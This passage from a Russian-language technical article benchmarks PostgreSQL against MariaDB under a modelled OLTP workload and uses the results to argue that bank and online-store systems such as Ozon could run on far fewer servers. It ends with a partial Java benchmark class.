больше аналогичного коэффициента для, например, передачи данных. Если суммарно запрос-ответ занимают 10кб, то на сетевом адаптере производительностью 1 гигабит получаем возможность обработать 10 000 запросов. Но на сервере легко может быть установлено 10 таких адаптеров, что даёт нам уже 100 000 запросов, или соотношение 1 к всего лишь 10. Сравните перегрузку сервера по сетевому обмену с возможной перегрузкой в 1000 раз по обработке запросов. Это сравнение показывает второстепенную роль сетевой нагрузки в задачах OLTP.Итак, мы выяснили, что узким местом при большой нагрузке, типичной для задач OLTP, является непосредственно сервер. Именно на нём мы далее и сконцентрируемся.Моделирование ИТ системыДля выявления потенциала системы проведём эксперимент на модели. Модель должна максимально близко отражать особенности реальных систем, не смотря на всё их многообразие. Но, с другой стороны, для оценки потенциала нет никакой нужды обращать внимание на разного рода моду, вроде фреймворков, методик и методологий разработки, а так же ""передовые"" технологии. Сконцентрируемся на главном - записи, хранении и извлечении нужной информации.Подзадачи обработки информации в модели представлены задачами поиска и объединения данных. Поиск, очевидно, находит нужное оператору. Объединение же совмещает в одном пакете переданных клиентскому компьютеру данных всю информацию, необходимую в данный момент оператору. Другие операции, вроде вычисления процентов, сумм, количеств и тому подобного, на практике можно не брать в расчёт, что и подтвердит наш дальнейший эксперимент. Хотя стоит заметить, что некоторые вычисления, например ежедневные начисления процентов в банках, могут занимать довольно много времени, но эти задачи, во первых, не относятся к классу OLTP, а во вторых, при желании относительно легко могут быть введены в рассматриваемую далее модель простым умножением на коэффициент.Как было указано выше, операторы выполняют операции в рамках распределённого процесса. Это означает, что информацию об операциях необходимо хранить до момента, пока в ней не отпадёт потребность у других участников процесса. Поэтому в модель введена таблица operation. Далее мы будем рассуждать в терминологии реляционных баз данных, как наиболее часто используемых для хранения данных, и значит речь пойдёт о таблицах и их отношениях.Для учёта разнообразных сущностей, с которыми работают операторы, нам потребуется ещё одна таблица. Для простоты введём аналогию с банком - там есть клиенты и у них есть операции. Таблицу с операциями мы уже создали, осталось создать таблицу с клиентами, и назовём её неожиданно - client. Заметим, что общепринятой практикой именования таблиц является название в единственном числе (client, а не clients), потому  что таблица предназначена для учёта сущности ""клиент"" (обратите внимание - единственно число в названии сущности).Справочную информацию смоделируем иерархией адресов, начиная от страны и, вниз, до номера дома. Всего получится следующий набор таблиц: country, city, street, address. Такая иерархия хороша количеством таблиц, количеством записей в них, а так же наличием связей между всеми таблицами - опосредовано все таблицы связаны друг с другом.Логические связи (отношения) между таблицами такие:Операция относится строго к одному клиенту. У каждого клиента есть адрес, у адреса есть улица, у улицы есть город, у города есть страна, ну а страна у нас одна (одинокая, наверно её никто не любит). Все наши данные можно представить одной цепочкой, предыдущие звенья которой ссылаются на последующие: operation -> client -> address -> street -> city -> country.Моделирование операцийТеперь определимся с моделью обработки данных. Сначала мы заполняем все справочные таблицы, от клиента до страны. Это просто вставка в таблицы. Она не характерна для задач OLTP, но  раз мы её в любом случае вынуждены выполнять, зафиксируем получившийся результат. Затем начинается работа, когда операторы вводят данные операции, выполняемой клиентом. Либо, в случае интернет-магазина, клиент сам является оператором и сам вводит нужную информацию. При этом оператору нужна справочная информация. Во первых, будем предлагать ему данные о клиенте. Во вторых - данные о его операциях. И, дабы более точно имитировать нагрузку, вместе с данными о клиенте и операциях дадим оператору информацию по всей адресной цепочке, до страны, включительно.Помимо показанного выше поиска и группировки, нам нужно сохранить новые данные, а так же менять какие-либо старые. Поэтому включим в наш модельный набор одну вставку и одно изменение. В аналогии с банком это будет выглядеть как создание новой записи о денежной операции, а затем изменение остатка денег на счёте.По наполнению таблиц данными можно ограничиться набором, характерным для нескольких дней работы полноценной системы. Остальные данные уже активно не меняются, либо меняются в отношении примерно один к одному к числу клиентов. Слабо изменяющиеся данные обычно выносятся в отдельные блоки, остающиеся в рамках всё той же СУБД, но слабо влияющие на скорость массовых операций за счёт исключения самых тяжёлых действий, вроде активного расширения индексов или минимизации размера того же индекса, дабы он помещался в память. Поэтому в модельной системе нам понадобятся в полном объёме лишь справочные данные, а операции будут ограничены как раз теми блоками, которые и предназначены для активного использования, и значит определяют уровень загрузки системы. Остальные блоки на схеме нашего ядерного реактора условно не показаны из-за существенно меньшего влияния на производительность.На этом этапе уже можно говорить о полноценной модели. Разумеется, в реальности в том же банке есть много видов операций, но суть всегда та же самая - поиск, группировка, вставка, изменение. То есть если даже за один раз оператор проводит несколько операций, наша модель нисколько не теряет связь с реальностью, ведь мы можем имитировать множественные операции повтором нашей одной модельной группы операций нужное количество раз.Модельная системаСтандартной практикой в проектировании ИТ систем является разделение на работающие на разных серверах компоненты. В нашем случае главным модельным компонентом будет база данных, или точнее - система управления базами данных (СУБД). Второй компонент - условный сервер приложений, или микросервис, если использовать более модную терминологию. Его задача пред- и пост-обработка данных из СУБД. Поскольку этот компонент не хранит информации на медленных устройствах (например на диске), он ограничен только памятью и производительностью процессора. Все медленные операции выполняет СУБД, которая, будучи заточенной на работу с медленными устройствами, в нашей модели может моделировать и операции чтения-записи в файлы, в которых сервера могут хранить какие-то настройки. Остальные задачи - быстрые, то есть быстро выполняемые процессором. Для задач OLTP обычно производительности процессоров хватает с большим запасом. В дальнейшем тестировании так же видно, что по загрузке процессора у нас будет очень большой запас - процессор клиентской части в тестах задействуется максимум на пару процентов. Значит дополнительные расчёты на сервере приложений не смогут существенно исказить результаты моделирования. Поэтому сервер приложений считаем вполне справляющимся с нагрузкой и более не концентрируем на нём своё внимание.СУБД в нашей модели несёт на себе главную нагрузку, поэтому важно абстрагироваться от её реализации, чего мы достигнем проведением моделирования на двух вариантах СУБД. Первый - весьма распространённая (модная) у нас бесплатная СУБД PostgreSQL. Второй - весьма распространённая в других странах бесплатная СУБД MariaDB (вариант давно известной MySql, более близкий к PostgreSQL по открытости). Первая выбрана из-за распространённости и массового перехода на неё в связи с импортозамещением. Вторая - для сравнения с модной тенденцией, ведь моделей на подиуме должно быть больше одной.Моделирование высококонкурентной среды реализуется при помощи настраиваемого числа потоков, параллельно выполняющих операции с СУБД. Модельные OLTP операции выполняются атомарно, то есть в транзакции. Блокировки реализуются на уровне СУБД без проверок на изменение данных другим потоком после чтения текущим. Такой выбор объясняется выбранным подходом к моделированию - вместо введения дополнительной нагрузки для точного моделирования проверки отличий версий записи из СУБД, есть смысл аппроксимировать стандартный вариант оптимистической блокировки путём умножения количества модельных операций на два, то есть первая модельная операция эквивалентна первому чтению из СУБД, вторая - повторному чтению с проверкой версии записи и внесением завершающих изменений.Методика оценки производительностиСразу заметим, что оптимизаций на уровне настроек СУБД не выполнялось. Смысл такого подхода простой - самое востребованное направление в работе с СУБД, это OLTP. Если разработчики универсальных (по их собственному утверждению) СУБД распространяют свои решения с настройками по умолчанию, нацеленными на какую-то другую область, то вряд ли они стали бы во всеуслышание заявлять о универсальности своих продуктов. Поэтому предполагается, что настройки по умолчанию, как минимум, не являются явно плохими для задач OLTP. Плюс второй момент - настраивая специфические для СУБД опции мы уходим от моделирования произвольной системы в сторону оптимизации узко заточенного под конкретные задачи уникального решения.Заполнение справочников даёт нам неплохую возможность смоделировать работу системы на массовых (пакетных) операциях. Хоть это и не OLTP, но результат интересен. Время вставки множества записей в одной транзакции (обычная, ускоряющая вставку практика) позволяет относительно точно оценить скорость массовой обработки данных. Операция вставки в таблицу может выполняться по разному в зависимости от дополнительных условий, поэтому часть данных мы вставим при одних условиях, а другую, соответственно, при других, что бы пощупать больше возможных вариантов. Все вставки в справочники будут выполняться в одной транзакции и в одном потоке (без параллельности).Первый вариант вставки - с одним единственным индексом в виде первичного ключа. Это минимальный набор ограничений. Второй вариант - с ограничением целостности данных по внешнему ключу. Третий вариант - с добавкой дополнительного индекса.Адресные таблицы заполняются за один подход с уже заданным ограничением по внешнему ключу, чем проверяется скорость варианта номер два. Таблица с клиентами заполняется в трёх подходах: только первичный ключ, добавлен индекс на поле ""Имя"", добавлено ограничение целостности связи с адресами. Стоит добавить, что ссылки на внешние ключи заполняются в среднем равномерно по всему массиву доступных значений, то есть при чтении данных не возникнет такой ситуации, когда на один адрес ссылаются 100 клиентов, а на другой никто не ссылается.После заполнения справочников начинается тестирование скорости выполнения рабочих операций. Каждая такая операция включает набор операций помельче, но вся группа выполняется как одно целое, то есть в одной транзакции на групповую операцию. Сначала моделируется распределённая по клиентам нагрузка, то есть на одного клиента приходится мало операций. Это создаёт один вариант нагрузки на СУБД. Затем моделируется локализованная нагрузка, когда на относительно небольшое количество клиентов приходятся все операции. Это второй вариант.Количество потоков при выполнении рабочих операций: Для обоих выбранных СУБД в ходе предварительного тестирования было выбрано оптимальное количество потоков в рамках тестовой конфигурации. Для MariaDB это максимум, допустимый при настройках по умолчанию - 150 потоков. Для PostgreSQL это 33 потока. За оптимальность при других условиях, разумеется, автор не ручается.Количество записей: В адресах всё начинается со 100 стран и далее на каждом шаге количество записей умножается на 50. То есть на последнем шаге (в таблице адресов) будет 12.5 миллионов записей. Клиенты заполняются в количестве 10 миллионов, партиями по одной трети (3.3 млн) за подход, при этом дополняя СУБД новыми ограничениями на каждом шаге. Распределённая вставка операций выполняется 10 миллионов раз. Локализованная вставка выполняется несколько десятков тысяч раз, в зависимости от количества параллельных потоков, которые может обслужить СУБД при настройках по умолчанию.Состав одной моделируемой рабочей операции (транзакции): Чтение данных по одному клиенту со связками по всем адресным таблицам (до страны, включительно). Чтение данных до сотни последних операций со связками к клиенту и по всем адресным таблицам (включая страну). Изменение одного значения (например - суммы, остатка, другого показателя, в зависимости от моделируемой области) в одной произвольной записи в таблице операций из прочитанных в транзакции. Вставка новой операции. Итого - два чтения, каждое с несколькими объединениями таблиц, и две записи - в существующие данные с их изменением и новой строки.Моделирование полностью повторялось для каждой СУБД на двух видах дисков - обычном, HDD, и ""быстром"", то есть на SSD.Используемое железоПроцессор: i7-9700F 3.00GHzПамять: 32,0 GBДиск SSD: Samsung SSD EVO 860Диск HDD: Seagate ST3000DM007Используемый софтWindows 11PostgreSQL 16.1MariaDB 11.2.2Java 17Результат моделированияИз представленных тестов наиболее отвечающим жизненным реалиям автор считает многопоточные распределённые операции со всеми созданными индексами и ограничениями. Без индексов мы не получим скорости поиска, а без ограничений мы наверняка получим недовольных клиентов, у которых потеряли адрес, или даже денежные операции на большие суммы.Ниже представлены результаты измерения скорости операций:Сводная таблица с данными по однопоточной вставке в справочники и многопоточной вставке в таблицу операцийСтатистика по времени и количеству операций при вставке в справочники (верхняя часть) и таблицу операций (нижняя часть)Локализованная вставка с разным числом потоков в таблицу операций, расположенную на HDD дискеЛокализованная вставка с разным числом потоков в таблицу операций, расположенную на SSD дискеВремя и количество вставок с разным числом потоков на HDD и SSD для MariaDB (верхняя часть) и PostgreSQL (нижняя часть)Время операции в зависимости от числа потоков для MariaDB на HDD (количество потоков = число по оси Х умноженное на 10)Время операции в зависимости от числа потоков для MariaDB на SSD (количество потоков = число по оси Х плюс 1, умноженное на 10)Результаты не во всём идеальные, но вроде понятные. Для MariaDB пропущен шаг с 10-ю потоками при работе с SSD. Для PostgreSQL графики строить нет смысла из-за наличия данных лишь по четырём вариантам для количества потоков.Но пройдёмся по всему по порядку. Вставка в справочники на HDD быстрее выполнена PostgreSQL, но на SSD - MariaDB ведёт с небольшим отрывом. Вставка клиентов на HDD сначала опять выводит вперёд PostgreSQL, и даже с очень большим отрывом при выполнении операции создания ограничения, но вот когда ограничение создано, тут PostgreSQL начинает проигрывать во много раз. На SSD картина меняется - MariaDB обгоняет по большинству операций, а по последней вставке разрыв становится просто неприличным. Хотя время создания ограничения по прежнему сильно больше у PostgreSQL. Но нам ведь интересна работа, а не подготовка к ней.Запускаем 150 потоков, и MariaDB уверенно рвёт конкурента по времени раз в 5-7, и на SSD, и на HDD. Правда у MariaDB наблюдается непонятная максимальная задержка при вставке в базу с количеством записей до 3.3 млн - почти 10 секунд, такую задержку нельзя списать на случайное использование компьютера для целей, не относящихся к моделированию. Но PostgreSQL при вставке в таблицу с не менее чем 6.6 млн записей показывает гораздо худший результат - максимальное время ожидания аж полторы минуты. Такая пауза заставит большинство операторов начать панические действия по перезагрузке компьютера или что-то подобное. Ну а если такое случится при вызове от сторонней системы, она просто отвалится по таймауту.В данном тесте выявилось вполне ожидаемое замедление при наполнении базы. Но что интересно, при работе с HDD (в отличии от SSD) замедление оказывается пропорционально корню из отношения количества записей до и после всех вставок. Занимательная загадка для любителей считать О большое в различных алгоритмах.Тест с локализованными данными проводился с нарастающим числом потоков, пока СУБД не отказывалась принимать соединения. MariaDB приняла все указанные в настройках по умолчанию 150 потоков. И с ростом количества потоков наблюдался, хоть и незначительный при больших значениях числа потоков, но всё же рост производительности. Занимательной особенностью производительности MariaDB является зависимость от каких-то внутренних ресурсов - если число потоков кратно этим ресурсам, наблюдается ускорение, если не кратно - замедление. На графике это выглядит как ломаная линия, похожая на затухающую синусоиду. Опять загадка для умеющих считать О большое.PostgreSQL не смогла осилить 50 потоков. На части из них драйвер выдал ""The connection attempt failed"" или ""Read timed out"". Поэтому более 40 потоков чисто протестировать не удалось. Хотя не исключено, что поковырявшись в настройках эту ситуацию можно исправить. Но MariaDB такого ковыряния не потребовала. У PostgreSQL так же наблюдается рост производительности с ростом числа потоков в варианте с HDD, но вот с SSD имеем спад производительности. Кроме того, в варианте с HDD первая серия вставок с 10 потоками выполнялась намного медленнее остальных серий. Возможно прогревались внутренние кэши. У MariaDB такого единичного скачка не наблюдалось.Общий итогБезусловный лидер по рабочим операциям - MariaDB, и на дисках типа SSD, и на HDD. Она же показала наиболее предсказуемые результаты при работе с различным количеством потоков, а так же не удивила нас неожиданными паузами длительностью более 10 секунд. Ещё один хороший сигнал - хоть и затухающий, но рост производительности с увеличением числа потоков. Хотя по отдельным операциям в одном потоке и в одной транзакции PostgreSQL всё же даёт нам какие-то преимущества.Но наша задача не в поиске самой быстрой пули (ведь всегда можно заявить, что некие настройки СУБД всё кардинально изменят, либо вообще перевести обсуждение в плоскость какой-либо специфической особенности, которую у победителя не реализовали). Мы хотим оценить потенциальную производительность ИТ систем.Использование модели для оценки ИТ системы банкаПредположим у нас есть банк и мы его автоматизируем. В нашей модели у банка есть 10 миллионов клиентов. Можно достаточно уверенно предположить, что в среднем в один день средний клиент выполнит около двух операций (сам в интернете или опосредовано, через оператора банка). Итого получаем 20 миллионов операций за 86 400 секунд или 232 операции в секунду. Как мы видим из результатов моделирования - даже у аутсайдера на HDD дисках есть запас в 80 операций для покрытия неравномерности нагрузки. Хотя, скорее всего, такого запаса не хватит, но у нас ведь есть вариант с использованием SSD диска. То есть нам хватит одного единственного компьютера с SSD диском для удовлетворения потребностей банка с 10 миллионами клиентов даже на PostgreSQL, если кому-то не нравится победитель - MariaDB.Критики могут заметить, что операции бывают разные, в них бывает разное количество сгруппированных операций, что они требуют передачи данных в другие системы. Заранее отвечу - передача в другие системы предполагает, что наш сервер приложений, или наш микросервис, связывается с кем-то по сети и отправляет туда какие-то данные. Но основная нагрузка у нас приходится на СУБД. То есть почти не загруженный работой сервер приложений, во первых, никак не затормозит СУБД отправкой информации, а во вторых, как мы считали немного выше, за секунду наш сервер приложений сможет отправить запросов и получить ответов этак штук десять тысяч, а может и сто тысяч, если сетевых плат ему дадут побольше. Сравним цифру 10 000 с потребными для банка парой-тройкой сотен операций в секунду. Так мы показываем, что отправка сообщений в другие системы не способна перегрузить наш сервер приложений. Хотя, разумеется, если проектировать системы не думая о производительности, то наверняка можно перегрузить даже совсем не занятый работой сервер.Второй момент - операции бывают разные. Да, бывают, но природа у них у всех одна, её мы обсуждали выше - поиск, группировка, вставка, изменение. Именно такой набор действий и выполняет каждая наша моделируемая операция. Но если в ходе одной банковской операции почему-то нужно не только зафиксировать факт операции и изменить количество денег на счету, но дополнительно требуются ещё обязательные операции, то мы ведь имеем неплохой запас в почти 1800 не занятых операций на PostgreSQL. А на MariaDB запас аж 9300 операций. То есть что бы перегрузить нашу СУБД требуется примерно в 8 с половиной раз больше действий на каждую банковскую операцию, нежели в нашей модели. Ну а MariaDB даёт нам запас аж в 42 раза. Интересно было бы узнать о банке, который требует хотя бы в 8 раз больше действий на каждую операцию, нежели в нашей модели. Хотя если в банке считают все эти дополнительные действия разумными, ну что-ж, у нас всё ещё остаётся MariaDB с её запасом в 41 дополнительную операцию.Поясним ещё и третий момент. Операции по сети могут быть не быстрыми в сравнении со средним временем выполнения одной операции СУБД (около половины миллисекунды для PostgreSQL и сто микросекунд для MariaDB). В результате в наши операции может быть внесена задержка, длительностью больше, чем длительность операции в СУБД. Но здесь можно смело утверждать - для современных компьютеров это не проблема. Дело в том, что ИТ системы умеют работать с множеством потоков. Это означает, что пока один поток ждёт окончания сетевых операций, другой вполне может начать обработку следующего запроса. Значит, просто увеличивая количество потоков, получаем всё ту же производительность, не смотря на увеличение времени каждой отдельно взятой операции. И да, в ограничения по количеству потоков мы не упрёмся - смотрите количества потоков в тестах, где из доступных на большинстве ОС тысячи или более потоков задействуется максимум 150.По большому счёту, все изложенные аргументы давно известны и многим вполне очевидны, но если вдруг кто-то ещё не знаком с ними - пожалуйста, познакомьтесь.И ещё одно сравнениеДля дополнительного подтверждения универсальности предложенной модели попробуем смоделировать интернет-магазин. Возьмём для пример Ozon. Они относительно недавно размещали на Хабре информацию по своей подсистеме учёта доступности товаров и привели ряд интересных цифр. Полный набор операций ими озвучен не был, но мы ведь можем попробовать предположить.Но сначала о товарах. Поскольку Озон занимается продажей товаров, нам необходимо убедиться, что наша модель адекватно отражает не только операции по продаже, но и поиск по огромным залежам находящегося в продаже ширпотреба. Сколько уникальных товаров продаётся на Озоне? Именно уникальных - немного, несколько десятков тысяч наименований. Но вездесущий маркетинг не даёт покоя продавцам и они изобретают бесконечное количество комбинаций, когда какое-нибудь мыло с полностью идентичной основой продаётся в ассортименте на сотню и более наименований. Всего лишь меняем цвет - и вот уже с десяток новых ""мыл"". Но можно же менять и запах! Умножаем десяток цветов на 4-5 запахов, и вот вам 40-50 новых наименований. В общем, идею вы поняли - ассортимент на озоне очень большой именно за счёт такого любимого нами маркетинга. Но, с другой стороны, весь этот ассортимент нужно уметь находить и показывать по ограниченному количеству поисковых фраз. Поэтому продавцам приходится как-то сдерживать порыв маркетологов и группировать товары, например, в группу ""мыло"", увеличивая таким образом вероятность нахождения товара именно теми покупателями, которым нужно мыло, а не конкретно ""ландышевое зелёное бактерицидное жидкое в мягкой упаковке со скидкой при покупке двух пакетов весом в 100 грамм"". Это означает, что для моделирования всего ассортимента товаров озона нам должно хватить 10 миллионов наименований, которые уже имеются в таблице клиентов. Осталось только представить себе, что вместо клиентов в таблице у нас товары.Теперь продажи. По открытым данным Ozon делает в среднем около 27 продаж в секунду (209 миллионов заказов за 2-й квартал 23 года). Что включает одна продажа? Очевидно, это поиск клиента на сайте, кликанье на товары, потом переход в корзину и ряд шагов по выбору условий доставки и оплате. Скорее всего каждое добавление в корзину должно быть зафиксировано в СУБД. Если в среднем клиент покупает, допустим, 3 товара за один раз, то мы имеем три вставки в таблицу с операциями с корзиной, 3 изменения статуса товара для резервирования под данного покупателя, ну и три запроса на какие-то справочные данные по товарам. Вместе с покупкой будет 4 операции. К этому минимуму следует добавить несколько десятков запросов для отображения списка товаров, которые обычно сложно найти поиском и приходится долго листать страницы сайта, осуществляя эти самые запросы. В одном запросе обычно (сужу по своему взаимодействию с сайтом) возвращается 36 товаров (4 в строке на 9 строк).Сравним предположительный объём действий на сайте Ozon с нашей моделью. 4 вставки с 4-мя изменениями аналогичны четырём модельным операциям без дополнительных запросов. Но вполне вероятно, что дополнительные запросы есть, хотя мы и не знаем о их предназначении. Таким образом, 4*27=108 есть наш эквивалент в модельных операциях в секунду. Теперь учтём запросы для поиска. В каждой модельной операции присутствует запрос на сто последних операций со всеми справочниками. Один такой запрос, весьма вероятно, соответствует одному переходу на следующую страницу поиска. Пусть в среднем клиент листает 20 страниц, тогда на одну покупку нам нужно 20*27=540 модельных операций. Присутствующие в модели вставки в данном случае могут моделировать сбор маркетинговой информации о действиях клиента на сайте. Итого имеем 648 модельных операций в секунду.Смотрим в наши таблицы с результатами моделирования. Опять видим, что PostgreSQL имеет запас в 3.1 раза при работе с SSD, а MariaDB - 14.75 раз.Но далеко не все клиенты обязательно делают покупки, зайдя на Озон. Сколько есть тех, кто не покупает? Если они не покупают никогда, то зачем ходить на Озон? Если они, например, просто смотрят цены и видят, что в другом месте цены ниже, то может логично смотреть цены именно в этом другом месте? Значит логично предположить, что не покупают, но смотрят товары на Озоне, именно бывшие или будущие покупатели. Сколько раз вы прицениваетесь на Озоне перед покупкой? Ну пусть раз 10. Тогда суммарное количество операций у нас увеличится до примерно 6000 (540*10+648) в секунду. Это число уже не укладывается в запас для PostgreSQL. А MariaDB всё ещё даёт нам возможность в полтора с лишним раза масштабировать нагрузку. На одном компьютере.Теперь напомню, что по данным из статьи Ozon-а на Хабре, для работы подсистемы учёта наличия товаров задействуются около 700 серверов, плюс ещё пара сотен под разнообразные кэши.Соглашусь с тем, что озону нужно резервирование, а потому логично выделить под эти нужды сколько-то компьютеров. Затем вспомним о делении на СУБД и сервер приложений, значит нам нужно ещё умножить количество компьютеров на два. Но как Озон получил цифру 900 при весьма вероятно достаточном количестве в, например, 9 компьютеров? В сто раз больше. Интересный вопрос о производительности информационных систем.ЗаключениеПроизводительность современных информационных систем может быть существенно больше в сравнении с распространённой практикой. Но для этого нужен некий финансовый стимул. Никакие разговоры про чьи-то рекорды не убедят менеджеров, пока прибыль не просядет. Но что странно, интернет-магазин Озон убыточен (согласно его финансовой отчётности), а внимания производительности по прежнему уделяет недостаточно (на мой субъективный взгляд, разумеется). В структуре затрат расходы на ИТ-инфраструктуру (расходы на технологии и контент) представляют из себя 6.6 миллиарда за квартал при убытках в 13.4 миллиарда за тот же квартал. Можно ли сократить убытки в два раза? Если ориентироваться на расходы на технологии и контент, то снизив их до нуля, получим как раз половину от суммы убытков. Разумеется, полностью исключить такие расходы нельзя, но вспоминая о потенциально возможном сокращение количества компьютеров в 100 раз (пусть даже с существенной ошибкой), легко верится, что затраты на ИТ можно сократить эдак раз в 10, и такое сокращение почти равно половине суммы убытков. Конечно же, это очень оптимистичные расчёты, но тем не менее, хочется надеяться, что таким расчётом масштаб проблемы показан достаточно выпукло для привлечения внимания санитаров.Учитывая выше сказанное, всем читателям предлагается задуматься над вопросом эффективности ИТ систем. И возможно даже кто-то увидит в приведённом подходе подсказку для практических действий в правильном направлении. Хотя больших надежд на улучшение ситуации, к сожалению, у меня нет.ПриложениеВсе тестовые действия можно выполнить одним запуском прилагаемого Java-класса. Список действий вы найдёте в стандартном для запуска Java-программ методе public static void main(String args[]), при желании можно закомментировать какую-то часть и выполнять операции поотдельности. Для запуска тестов необходимо установить необходимые СУБД, создать в них тестовые схемы, а так же пользователей, которым даны права на изменение DML и DDL операции, после чего задать строки подключения к СУБД в коде (метод getConnectionString) и обеспечить присутствие соответствующих JDBC-драйверов в пути к классам.Код для моделированияpackage test;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.sql.Timestamp;
import java.text.DecimalFormat;
import java.util.concurrent.atomic.AtomicInteger;

public class DbTest
{
  public enum Databases { MariaDB, PostgreSQL }

  private static class RRef
  {
    private final static long prime=982_451_653, base=11, startR;
    long r=nextR(startR);
    
    static
    {
      long n=base;
      while (n<prime)
        n=n*base;
      startR=n%prime;
    }
    private static long nextR(long r)
    { return r*base%prime; }
    
    RRef()
    {}
    RRef(long start)
    { r=start; }
    int nextRef(int parentCount)
    {
      while (true)
      {
        long ref=r%parentCount;
        r=nextR(r);
        if (ref>0) return (int)ref;
      }
    }
  }

  public static void main(String args[])
  {
    Databases type=Databases.PostgreSQL;
    int clientInsertCount=3_333_333; // * 3 = 10M
    try
    {
      db(type, DbTest::dropAll);
      db(type, DbTest::dictsCreate);
      db(type, DbTest::dictsInsert);
      db(type, (t,s,c)->clientInsert(clientInsertCount, 12_500_000, t, s, c));
      recreateOperation(type);
      int threadNumber = switch (type)
      {
        case MariaDB -> 150;
        case PostgreSQL -> 33;
      };
      operationsInsert(clientInsertCount/threadNumber,threadNumber,RRef.startR,type,clientInsertCount);
      operationsInsert(clientInsertCount/threadNumber,threadNumber,findShift(type),type,clientInsertCount);
      operationsInsert(clientInsertCount/threadNumber,threadNumber,findShift(type),type,clientInsertCount);
      int maxThreadNumber = switch (type)
      {
        case MariaDB -> 150; // if more then ""Too many connections"" exception is thrown
        case PostgreSQL -> 60; // if more then ""Read timed out"" exceptions are thrown
      };
      for (int tn=10;tn<=maxThreadNumber;tn+=10)
        operationsInsert(clientInsertCount/33/tn,tn,0,type,clientInsertCount);
    }
    catch (Exception e) { e.printStackTrace(); }
  }
  
  protected static Void operationsInsert(int insertCount, int threadCount, long start0, Databases dbType, int clientCount) throws SQLException, InterruptedException, ClassNotFoundException
  {
    System.out.println(dbType+"" transactions (trans*threads):"");
    System.out.println(insertCount+""*""+threadCount);
    long step = shiftRr(insertCount);
    AtomicInteger threadCounter=new AtomicInteger();
    Thread ts[]=new Thread[threadCount];
    for (int i=0;i<ts.length;i++)
    {
      long start = start0==0?RRef.startR:start0;
      start0=start0*step%RRef.prime;
      ts[i]=new Thread(()->
      {
        threadCounter.addAndGet(1);
        try { db(dbType, (t,s,c)->operationsUnit(start,insertCount,clientCount,t,s,c)); }
        catch (ClassNotFoundException | SQLException e) { throw new RuntimeException(e); }
        finally { if (threadCounter.addAndGet(-1)==0) synchronized (ts) { ts.notifyAll(); } }
      },""t""+i);
    }
    long t=System.currentTimeMillis();
    for (int i=0;i<ts.length;i++)
    {
      ts[i].start();
      Thread.sleep(10); // to prevent ""socket failed to connect...""
    }
    synchronized (ts) { ts.wait(); }
    t=System.currentTimeMillis()-t;
    DecimalFormat df1=new DecimalFormat(""### ### ###.000"");
    DecimalFormat df2=new DecimalFormat(""### ### ###"");
    System.out.println(""Total time: ""+t+"" = ""+df1.format(1.0*t/insertCount/threadCount)+""ms/tr = ""+df2.format(insertCount*threadCount*1000l/t)+""tr/sec"");
    System.out.println();
    return null;
  }

  private static Void operationsUnit(long rrStart, int insertCount, int clientCount, Databases dbType, Statement st, Connection conn) throws SQLException
  {
    try (PreparedStatement pst=conn.prepareStatement(""insert into operation (summa, client_id, op_time) values (?,?,?)"");
         PreparedStatement pst2=conn.prepareStatement(""update operation set summa=? where id=?""))
    {
      RRef rr=new RRef(rrStart);
      long t=System.currentTimeMillis(), maxLocalTime=0, sumLocalTime=0;
      for (int i=0;i<insertCount;i++)
      {
        long localTime=System.currentTimeMillis();
        int clientId=rr.nextRef(clientCount);
        ResultSet rs=st.executeQuery(""select * from client c ""
            + ""left join address a on c.address_id=a.id ""
            + ""left join street s on s.id=a.street_id ""
            + ""left join city ci on ci.id=s.city_id ""
            + ""left join country co on co.id=ci.country_id ""
            + ""where c.id=""+clientId);
        rs.next();
        rs.close();
        int limit=100;
        String limitRows = switch (dbType)
        {
          case MariaDB -> limitRows=""limit ""+limit;
          case PostgreSQL -> limitRows=""limit ""+limit;
        };
        rs=st.executeQuery(""select o.id, o.*, c.*, a.*, s.*, ci.*, co.* from operation o ""
            + ""left join client c on o.client_id=c.id ""
            + ""left join address a on c.address_id=a.id ""
            + ""left join street s on s.id=a.street_id ""
            + ""left join city ci on ci.id=s.city_id ""
            + ""left join country co on co.id=ci.country_id ""
            + ""where c.id=""+clientId+"" ""
            + ""order by o.id desc ""+limitRows);
        int k=0, pos=(int)(Math.random()*limit), last=-1;
        while (rs.next())
        {
          last=rs.getInt(1);
          if (k==pos) break;
          k++;
        }
        rs.close();
        if (last>0)
        {
          pst2.setInt(1,pos+20);
          pst2.setInt(2,last);
          pst2.execute();
        }
        pst.setInt(1,(int)(Math.random()*1000+1));
        pst.setInt(2,clientId);
        pst.setTimestamp(3,new Timestamp(System.currentTimeMillis()));
        pst.execute();
        conn.commit();
        localTime=System.currentTimeMillis()-localTime;
        if (localTime>maxLocalTime) maxLocalTime=localTime;
        sumLocalTime=sumLocalTime+localTime;
        if (i>0 && i%10000==0) System.out.println(Thread.currentThread().getName()+"": ""+i);
      }
      String message=Thread.currentThread().getName()+"" is finished, time=""+(System.currentTimeMillis()-t)+"", maxWait=""+maxLocalTime+"", avgWait=""+sumLocalTime/insertCount;
      System.out.println(message);
    }
    return null;
  }

  protected static void recreateOperation(Databases type) throws SQLException, ClassNotFoundException
  {
    db(type, (t,st,c)->
    {
      switch (type)
      {
        case MariaDB:
          st.execute(""drop table if exists operation"");
          st.execute(""create table operation (id integer AUTO_INCREMENT primary key, summa integer, client_id integer references client (id), op_time timestamp)"");
          break;
        case PostgreSQL:
          st.execute(""drop table if exists operation"");
          st.execute(""create table operation (id SERIAL primary key, summa integer, client_id integer references client (id), op_time timestamp)"");
          st.execute(""create index on operation (client_id)"");
          break;
      }
      return null;
    });
  }
  
  protected static void dictsTest(Databases type) throws SQLException, ClassNotFoundException
  {
    System.out.println(type);
    db(type, DbTest::dropAll);
    db(type, DbTest::dictsCreate);
    db(type, DbTest::dictsInsert);
  }

  private static void recreateClientAndOperation(Databases dbType, Statement st, Connection conn) throws SQLException
  {
    switch (dbType)
    {
      case MariaDB:
        st.execute(""drop table if exists operation"");
        st.execute(""drop table if exists client"");
        st.execute(""create table client (id integer AUTO_INCREMENT primary key, address_id integer, name varchar(30), last_name varchar(30))"");
        st.execute(""create table operation (id integer AUTO_INCREMENT primary key, summa integer, client_id integer references client (id), op_time timestamp)"");
        break;
      case PostgreSQL:
        st.execute(""drop table if exists operation"");
        st.execute(""drop table if exists client"");
        st.execute(""create table client (id SERIAL primary key, address_id integer, name varchar(30), last_name varchar(30))"");
        st.execute(""create table operation (id SERIAL primary key, summa integer, client_id integer references client (id), op_time timestamp)"");
        st.execute(""create index on operation (client_id)"");
        break;
    }
    conn.commit();
